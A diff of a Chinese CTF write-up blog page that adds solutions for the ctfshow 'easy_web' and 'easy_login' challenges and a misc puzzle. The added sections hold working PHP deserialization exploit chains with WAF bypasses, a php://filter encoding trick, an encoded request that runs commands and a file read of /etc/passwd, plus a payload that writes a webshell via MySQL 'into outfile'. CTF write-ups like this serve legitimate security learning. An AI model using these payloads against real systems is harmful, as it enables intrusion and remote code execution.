@@ -47,8 +47,8 @@ document.write('<script src="' + src + '" id="sozz"><\/script>');
 
 <!-- title、keywords、desc关键字 -->
 
-  <title>微言</title>
-  <meta name="title" content="微言" />
+  <title>友链</title>
+  <meta name="title" content="友链" />
 
 
 
@@ -100,8 +100,10 @@ daovoice('update');
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240118130310786.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240118130254061.png">
 <meta property="og:image" content="https://img.hzy2003628.top/image-20240118130504065.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118162515222.png">
+<meta property="og:image" content="https://img.hzy2003628.top/image-20240118165131848.png">
 <meta property="article:published_time" content="2024-01-11T06:34:46.000Z">
-<meta property="article:modified_time" content="2024-01-18T05:09:30.867Z">
+<meta property="article:modified_time" content="2024-01-18T13:48:38.775Z">
 <meta property="article:author" content="故里">
 <meta property="article:tag" content="ctfshow">
 <meta name="twitter:card" content="summary">
@@ -346,7 +348,7 @@ daovoice('update');
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-01-18 13:09:30" itemprop="dateModified" datetime="2024-01-18T13:09:30+08:00">2024-01-18</time>
+                <time title="修改时间：2024-01-18 21:48:38" itemprop="dateModified" datetime="2024-01-18T21:48:38+08:00">2024-01-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -396,14 +398,14 @@ daovoice('update');
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>10k</span>
+              <span>20k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>9 分钟</span>
+              <span>18 分钟</span>
             </span>
 
         </div>
@@ -641,8 +643,314 @@ POST包含pearcmd.php
 &#125;
 define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);
 require_once &#x27;pearcmd.php&#x27;;</code></pre>
+<h2 id="easy_web">easy_web</h2>
+<blockquote>
+<p><strong>php版本为5.5.9</strong></p>
+</blockquote>
+<pre><code class="hljs plaintext">&lt;?php
+header(&#x27;Content-Type:text/html;charset=utf-8&#x27;);
+error_reporting(0);
+
+
+function waf1($Chu0)&#123;
+    foreach ($Chu0 as $name =&gt; $value) &#123;
+        if(preg_match(&#x27;/[a-z]/i&#x27;, $value))&#123;
+            exit(&quot;waf1&quot;);
+        &#125;
+    &#125;
+&#125;
+
+function waf2($Chu0)&#123;
+    if(preg_match(&#x27;/show/i&#x27;, $Chu0))
+        exit(&quot;waf2&quot;);
+&#125;
+
+function waf_in_waf_php($a)&#123;
+    $count = substr_count($a,&#x27;base64&#x27;);
+    echo &quot;hinthinthint,base64喔&quot;.&quot;&lt;br&gt;&quot;;
+    if($count!=1)&#123;
+        return True;
+    &#125;
+    if (preg_match(&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;,$a))&#123;
+        return True;
+    &#125;else&#123;
+        return false;
+    &#125;
+&#125;
+
+class ctf&#123;
+    public $h1;
+    public $h2;
+
+    public function __wakeup()&#123;
+        throw new Exception(&quot;fastfast&quot;);
+    &#125;
+
+    public function __destruct()
+    &#123;
+        $this-&gt;h1-&gt;nonono($this-&gt;h2);
+    &#125;
+&#125;
+
+class show&#123;
+
+    public function __call($name,$args)&#123;
+        if(preg_match(&#x27;/ctf/i&#x27;,$args[0][0][2]))&#123;
+            echo &quot;gogogo&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Chu0_write&#123;
+    public $chu0;
+    public $chu1;
+    public $cmd;
+    public function __construct()&#123;
+        $this-&gt;chu0 = &#x27;xiuxiuxiu&#x27;;
+    &#125;
+
+    public function __toString()&#123;
+        echo &quot;__toString&quot;.&quot;&lt;br&gt;&quot;;
+        if ($this-&gt;chu0===$this-&gt;chu1)&#123;
+            $content=&#x27;ctfshowshowshowwww&#x27;.$_GET[&#x27;chu0&#x27;];
+            if (!waf_in_waf_php($_GET[&#x27;name&#x27;]))&#123;
+                file_put_contents($_GET[&#x27;name&#x27;].&quot;.txt&quot;,$content);
+            &#125;else&#123;
+                echo &quot;绕一下吧孩子&quot;;
+            &#125;
+                $tmp = file_get_contents(&#x27;ctfw.txt&#x27;);
+                echo $tmp.&quot;&lt;br&gt;&quot;;
+                if (!preg_match(&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;,$_GET[&#x27;cmd&#x27;]))&#123;
+                    eval($tmp($_GET[&#x27;cmd&#x27;]));
+                &#125;else&#123;
+                    echo &quot;waf!&quot;;
+                &#125;
+
+            file_put_contents(&quot;ctfw.txt&quot;,&quot;&quot;);
+        &#125;
+        return &quot;Go on&quot;;
+        &#125;
+&#125;
+
+
+if (!$_GET[&#x27;show_show.show&#x27;])&#123;
+    echo &quot;开胃小菜，就让我成为签到题叭&quot;;
+    highlight_file(__FILE__);
+&#125;else&#123;
+    echo &quot;WAF,启动！&quot;;
+    waf1($_REQUEST);
+    waf2($_SERVER[&#x27;QUERY_STRING&#x27;]);
+    if (!preg_match(&#x27;/^[Oa]:[\d]/i&#x27;,$_GET[&#x27;show_show.show&#x27;]))&#123;
+        unserialize($_GET[&#x27;show_show.show&#x27;]);
+    &#125;else&#123;
+        echo &quot;被waf啦&quot;;
+    &#125;
+
+&#125;</code></pre>
+<p>反序列化+绕WAF-RCE，拆开来看，先看反序列化部分</p>
+<pre><code class="hljs plaintext">class ctf&#123;
+    public $h1;
+    public $h2;
+
+    public function __wakeup()&#123;
+        throw new Exception(&quot;fastfast&quot;);
+    &#125;
+
+    public function __destruct()   //1.new ctf
+    &#123;
+        $this-&gt;h1-&gt;nonono($this-&gt;h2);  //2.不存在的方法nonono触发__call
+    &#125;
+&#125;
+
+class show&#123;
+
+    public function __call($name,$args)&#123;
+        if(preg_match(&#x27;/ctf/i&#x27;,$args[0][0][2]))&#123; //3.这地正则匹配就会触发__tostrings
+            echo &quot;gogogo&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Chu0_write&#123;
+    public $chu0;
+    public $chu1;
+    public $cmd;
+    public function __construct()&#123;
+        $this-&gt;chu0 = &#x27;xiuxiuxiu&#x27;;
+    &#125;
+
+    public function __toString()&#123;  
+        echo &quot;__toString&quot;.&quot;&lt;br&gt;&quot;;
+        if ($this-&gt;chu0===$this-&gt;chu1)&#123;         //4.地址一样值就肯定相等
+            $content=&#x27;ctfshowshowshowwww&#x27;.$_GET[&#x27;chu0&#x27;];
+            if (!waf_in_waf_php($_GET[&#x27;name&#x27;]))&#123;
+                file_put_contents($_GET[&#x27;name&#x27;].&quot;.txt&quot;,$content);
+            &#125;else&#123;
+                echo &quot;绕一下吧孩子&quot;;
+            &#125;
+                $tmp = file_get_contents(&#x27;ctfw.txt&#x27;);
+                echo $tmp.&quot;&lt;br&gt;&quot;;
+                if (!preg_match(&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;,$_GET[&#x27;cmd&#x27;]))&#123;
+                    eval($tmp($_GET[&#x27;cmd&#x27;]));   //door
+                &#125;else&#123;
+                    echo &quot;waf!&quot;;
+                &#125;
+
+            file_put_contents(&quot;ctfw.txt&quot;,&quot;&quot;);
+        &#125;
+        return &quot;Go on&quot;;
+        &#125;
+&#125;
+
+
+if (!$_GET[&#x27;show_show.show&#x27;])&#123;
+    echo &quot;开胃小菜，就让我成为签到题叭&quot;;
+    highlight_file(__FILE__);
+&#125;else&#123;
+    echo &quot;WAF,启动！&quot;;
+    waf1($_REQUEST);
+    waf2($_SERVER[&#x27;QUERY_STRING&#x27;]);
+    if (!preg_match(&#x27;/^[Oa]:[\d]/i&#x27;,$_GET[&#x27;show_show.show&#x27;]))&#123;  //不能出现O:数字或者a:数字，那就用C代替来绕过，同时show_show.show=&gt;show[show.show
+        unserialize($_GET[&#x27;show_show.show&#x27;]);   //反序列化点
+    &#125;else&#123;
+        echo &quot;被waf啦&quot;;
+    &#125;
+
+&#125;</code></pre>
+<blockquote>
+<p>ctf::__destruct -&gt; show::__call -&gt; Chu0_write::__toString</p>
+</blockquote>
+<pre><code class="hljs plaintext">$a = new ctf();
+$a-&gt;h1 = new show();
+$b = new Chu0_write();
+$a-&gt;h2 = array(array(&#x27;&#x27;, &#x27;&#x27;, $b)); // 等价于$a-&gt;h2=[[2=&gt;new Chu0_write()]]
+$b-&gt;chu1 = &amp;$b-&gt;chu0;  //相同地址值肯定相等就能绕过
+
+$c=new ArrayObject($a);  //用ArrayObject就能将POC的O-&gt;C
+echo serialize($c);
+
+//C:11:&quot;ArrayObject&quot;:167:&#123;x:i:0;O:3:&quot;ctf&quot;:2:&#123;s:2:&quot;h1&quot;;O:4:&quot;show&quot;:0:&#123;&#125;s:2:&quot;h2&quot;;a:1:&#123;i:0;a:3:&#123;i:0;s:0:&quot;&quot;;i:1;s:0:&quot;&quot;;i:2;O:10:&quot;Chu0_write&quot;:3:&#123;s:4:&quot;chu0&quot;;N;s:4:&quot;chu1&quot;;R:10;s:3:&quot;cmd&quot;;N;&#125;&#125;&#125;&#125;;m:a:0:&#123;&#125;&#125;</code></pre>
+<img src="https://img.hzy2003628.top/image-20240118162515222.png" alt="image-20240118162515222" style="zoom:200%;">
+<p>然后看WAF1，不允许有小写字母，不过这有办法可以绕过，利用$_REQUEST特性即可，就是POST比GET优先级高，传相同变量在POST和GET的时候，优先匹配POST的内容，也就是POST随便传个数字就能绕过。</p>
+<pre><code class="hljs plaintext">function waf1($Chu0)&#123;
+    foreach ($Chu0 as $name =&gt; $value) &#123;
+        if(preg_match(&#x27;/[a-z]/i&#x27;, $value))&#123;
+            exit(&quot;waf1&quot;);
+        &#125;
+    &#125;
+&#125;</code></pre>
+<p>WAF2，也是考察的PHP特性，$_SERVER[‘QUERY_STRING’]只能匹配没有url编码过的数据，也就是传的时候URL编码一下即可绕过</p>
+<pre><code class="hljs plaintext">function waf2($Chu0)&#123;
+    if(preg_match(&#x27;/show/i&#x27;, $Chu0))
+        exit(&quot;waf2&quot;);
+&#125;</code></pre>
+<p>然后是下面这段代码的绕过</p>
+<pre><code class="hljs plaintext">function waf_in_waf_php($a)&#123;
+    $count = substr_count($a,&#x27;base64&#x27;);
+    echo &quot;hinthinthint,base64喔&quot;.&quot;&lt;br&gt;&quot;;
+    if($count!=1)&#123;
+        return True;
+    &#125;
+    if (preg_match(&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;,$a))&#123;
+        return True;
+    &#125;else&#123;
+        return false;
+    &#125;
+&#125;
+
+
+$content=&#x27;ctfshowshowshowwww&#x27;.$_GET[&#x27;chu0&#x27;];
+            if (!waf_in_waf_php($_GET[&#x27;name&#x27;]))&#123;
+                file_put_contents($_GET[&#x27;name&#x27;].&quot;.txt&quot;,$content);
+            &#125;else&#123;
+                echo &quot;绕一下吧孩子&quot;;
+            &#125;
+                $tmp = file_get_contents(&#x27;ctfw.txt&#x27;);
+                echo $tmp.&quot;&lt;br&gt;&quot;;
+                if (!preg_match(&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;,$_GET[&#x27;cmd&#x27;]))&#123;
+                    eval($tmp($_GET[&#x27;cmd&#x27;]));  //door
+                &#125;else&#123;
+                    echo &quot;waf!&quot;;
+                &#125;
+
+            file_put_contents(&quot;ctfw.txt&quot;,&quot;&quot;);
+        &#125;</code></pre>
+<p>命令执行在$_GET[‘cmd’]，但是前面有个tmp参数，而tmp参数就是读取的ctfw.txt的内容，而这个文件的内容恰恰有脏数据ctfshowshowshowwww，这个时候用filterchain-base64来写文件可以进行去杂。</p>
+<p>waf_in_waf_php这个函数里面可以看到只允许出现一次base64，并且一些编码ucs-2和伪协议也过滤了。</p>
+<p>总之现在目的就是想办法去除ctfshowshowshowwww这串子数据，base64既然说了可以用一次，那就试试一次解码之后这些脏数据还剩多少，发现还剩r和0是还在码表里面的，也就是还能识别到的脏数据。</p>
+<img src="https://img.hzy2003628.top/image-20240118165131848.png" alt="image-20240118165131848" style="zoom:200%;">
+<p>现在目的就是通过过滤器的各种组合来使其不能被识别到。</p>
+<pre><code class="hljs plaintext">&lt;?php
+$data=&#x27;ctfshowshowshowwww&#x27;;
+var_dump($data);
+
+$true_data=iconv(&#x27;utf-16le&#x27;,&#x27;utf-8&#x27;,$data);
+var_dump(base64_decode($true_data));
+//D:\phpstudy\WWW\hzy\25.php:3:
+string(18) &quot;ctfshowshowshowwww&quot;
+D:\phpstudy\WWW\hzy\25.php:6:
+string(0) &quot;&quot;</code></pre>
+<p>然后生成我们需要的字符，system</p>
+<pre><code class="hljs plaintext">&lt;?php
+$b = &#x27;system&#x27;;
+$a = iconv(&#x27;utf-8&#x27;, &#x27;utf-16le&#x27;, base64_encode($b));
+echo quoted_printable_encode($a);
+//quoted_printable_encode用于填充空字节，因为utf-8转utf-16le会产生空字节，file_put_contents会对空字节报错
+//c=003=00l=00z=00d=00G=00V=00t=00</code></pre>
+<pre><code class="hljs plaintext">GET：name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw
+
+POST：chu0=c=003=00l=00z=00d=00G=00V=00t=00</code></pre>
+<p>还有最后一个是命令执行的RCE的绕过</p>
+<pre><code class="hljs plaintext">if (!preg_match(&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;,$_GET[&#x27;cmd&#x27;]))&#123;
+               eval($tmp($_GET[&#x27;cmd&#x27;]));   //door</code></pre>
+<p>这地方有两种思路，先看环境变量实在不行再读文件（<code>show_source</code>+<code>chr()</code>读文件），这里的show依然需要URL编码</p>
+<pre><code class="hljs plaintext">GET：?%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%36%37%3a%7b%78%3a%69%3a%30%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%52%3a%31%30%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%3b%6d%3a%61%3a%30%3a%7b%7d%7d&amp;name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&amp;chu0=c=003=00l=00z=00d=00G=00V=00t=00&amp;cmd=env
+                  
+POST：show[show.show=1&amp;name=1&amp;chu0=1&amp;cmd=1</code></pre>
+<pre><code class="hljs plaintext">回显内容：
+WAF,启动！__toString
+hinthinthint,base64喔
+system
+PHP_UPLOAD_MAX_FILESIZE=10M HOSTNAME=bcd37acba96c SHLVL=0 APACHE_RUN_DIR=/var/run/apache2 APACHE_PID_FILE=/var/run/apache2/apache2.pid PHP_POST_MAX_SIZE=10M PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin APACHE_LOCK_DIR=/var/lock/apache2 LANG=C DEBIAN_FRONTEND=noninteractive APACHE_RUN_USER=www-data APACHE_RUN_GROUP=www-data APACHE_LOG_DIR=/var/log/apache2 PWD=/app FLAG=ctfshow&#123;d5ce82ea-0fc7-4bec-abc4-99a9f5c3732f&#125;</code></pre>
+<p>若没有就构造来读文件</p>
+<pre><code class="hljs plaintext">%73%68%6F%77_source(&quot;\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64&quot;)  //类似这种</code></pre>
+<h2 id="easy_login">easy_login</h2>
+<p>几乎原题吧，反正找到的EXP能直接打</p>
+<pre><code class="hljs plaintext">&lt;?php
+
+session_start();
+class mysql_helper
+&#123;
+    public $option = array(
+        PDO::MYSQL_ATTR_INIT_COMMAND =&gt; &quot;select &#x27;&lt;?=`nl /*`;&#x27;  into outfile &#x27;/var/www/html/3.php&#x27;;&quot;
+    );
+&#125;
+class application
+&#123;
+    public $mysql;
+    public $debug = true;
+
+    public function __construct()
+    &#123;
+        $this-&gt;mysql = new mysql_helper();
+    &#125;
+
+&#125;
+$_SESSION[&#x27;user&#x27;] = new application();
+echo session_encode();</code></pre>
+<pre><code class="hljs plaintext">?action=main&amp;token=user|O:11:%22application%22:2:&#123;s:5:%22mysql%22;O:12:%22mysql_helper%22:1:&#123;s:6:%22option%22;a:1:&#123;i:1002;s:57:%22select%20%27%3C?=`nl%20/*`;%27%20%20into%20outfile%20%27/var/www/html/3.php%27;%22;&#125;&#125;s:5:%22debug%22;b:1;&#125;</code></pre>
+<h1 id="misc">MISC</h1>
+<h2 id="以假换真">以假换真</h2>
+<p>最简单的MISC，当时看了好久，没想到就差最后一步了，不过说实话之前没见过了还真想不出来最后一步咋写的</p>
+<p>简单步骤略过，foremost-&gt;明文攻击</p>
+<blockquote>
+<p>明文攻击的时候不是非得搞出来解压密码才能解出来</p>
+</blockquote>
+<p>解压出来之后baidu.png上传到百度网盘就能看到flag了，对，总之很抽象</p>
+<p>flag{487d06fc-8f40-421d-b8d0-e84b2da50579}</p>
 <h1 id="参考">参考</h1>
 <p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">关于pearcmd利用总结 (y4tacker.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B">欢迎回来 ᕕ(◠ڼ◠)ᕗ ctfshow元旦水友赛 | 雲流のLowest World (c1oudfl0w0.github.io)</a></p>
 
     </div>
 
@@ -766,7 +1074,7 @@ require_once &#x27;pearcmd.php&#x27;;</code></pre>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">1.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%88%E6%9C%88%E7%9A%84%E7%88%B1%E6%83%85%E6%95%85%E4%BA%8B"><span class="nav-number">1.1.</span> <span class="nav-text">月月的爱情故事</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BA%BB%E8%BE%A3%E5%85%94%E5%A4%B4%E5%8F%88%E4%B8%80%E9%94%85"><span class="nav-number">1.2.</span> <span class="nav-text">麻辣兔头又一锅</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_include"><span class="nav-number">2.1.</span> <span class="nav-text">easy_include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.1.1.</span> <span class="nav-text">SESSION文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pearcmd"><span class="nav-number">2.1.2.</span> <span class="nav-text">pearcmd</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E5%86%99"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">直接写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%80%9F%E5%8A%A9vps%E6%9D%A5%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">借助VPS来远程下载</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">1.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%88%E6%9C%88%E7%9A%84%E7%88%B1%E6%83%85%E6%95%85%E4%BA%8B"><span class="nav-number">1.1.</span> <span class="nav-text">月月的爱情故事</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BA%BB%E8%BE%A3%E5%85%94%E5%A4%B4%E5%8F%88%E4%B8%80%E9%94%85"><span class="nav-number">1.2.</span> <span class="nav-text">麻辣兔头又一锅</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_include"><span class="nav-number">2.1.</span> <span class="nav-text">easy_include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.1.1.</span> <span class="nav-text">SESSION文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pearcmd"><span class="nav-number">2.1.2.</span> <span class="nav-text">pearcmd</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E5%86%99"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">直接写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%80%9F%E5%8A%A9vps%E6%9D%A5%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">借助VPS来远程下载</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_web"><span class="nav-number">2.2.</span> <span class="nav-text">easy_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy_login"><span class="nav-number">2.3.</span> <span class="nav-text">easy_login</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A5%E5%81%87%E6%8D%A2%E7%9C%9F"><span class="nav-number">3.1.</span> <span class="nav-text">以假换真</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -1161,7 +1469,7 @@ require_once &#x27;pearcmd.php&#x27;;</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">18:07</span>
+    <span title="站点阅读时长">18:16</span>
 </div>
 
 
